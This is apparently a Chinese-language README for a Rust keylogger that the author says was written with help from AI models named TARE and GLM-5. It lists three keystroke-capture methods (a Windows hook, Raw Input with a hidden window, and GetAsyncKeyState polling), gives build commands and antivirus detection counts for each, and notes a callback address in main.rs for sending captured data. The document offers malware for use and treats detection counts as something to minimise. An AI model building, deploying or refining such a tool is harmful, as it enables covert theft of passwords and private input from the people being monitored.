在TARE和GLM-5的帮助下写的键盘记录器（Keylogger），演示了三种不同的键盘输入捕获方式：

1. Hook 方式：使用 Windows 钩子机制（SetWindowsHookExA）
默认使用，6检出，安全中危行为: 安装鼠标键盘相关消息钩子，SetWindowsHookExA
cargo build --release

2. Raw Input 方式：使用 Windows 原始输入 API
2检出，安全低危行为: 隐藏窗口，CreateWindowExA
cargo build --release --features raw-input --no-default-features

3. Polling 方式：使用轮询检测按键状态（GetAsyncKeyState）
6检出，安全低危行为：记录键盘状态, GetAsyncKeyState
cargo build --release --features polling --no-default-features

在main.rs里设置回连地址，默认是127.0.0.1:8080